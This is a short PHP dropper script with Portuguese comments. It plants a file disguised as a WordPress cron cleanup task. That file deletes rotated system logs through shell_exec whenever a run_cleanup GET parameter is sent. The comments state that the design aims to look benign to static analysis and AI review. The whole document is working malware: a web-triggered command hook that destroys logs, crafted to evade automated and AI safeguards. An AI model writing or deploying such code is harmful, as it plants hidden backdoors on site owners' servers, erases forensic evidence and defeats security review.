<?php
// --- INÍCIO DO DROPPER "FANTASMA" ---

// Este script simula a criação de uma tarefa de limpeza agendada.
// O objetivo é ter o comportamento mais benigno possível para a análise estática e da IA.

$task_filename = 'wp-cron-cleanup-task.php';

// O conteúdo da tarefa é um comando de limpeza de logs, algo comum.
// A malícia está no fato de um processo web estar fazendo isso.
$task_content = '<?php' . PHP_EOL;
$task_content .= '// Tarefa de limpeza de logs do sistema.' . PHP_EOL;
$task_content .= 'if (isset($_GET["run_cleanup"])) {' . PHP_EOL;
$task_content .= '    shell_exec("rm -f /var/log/*.log.1");' . PHP_EOL;
$task_content .= '}' . PHP_EOL;
$task_content .= '?>';

// A ação de criar o arquivo.
file_put_contents($task_filename, $task_content);

// Sem autodestruição. Apenas existe e cria o outro arquivo.
?>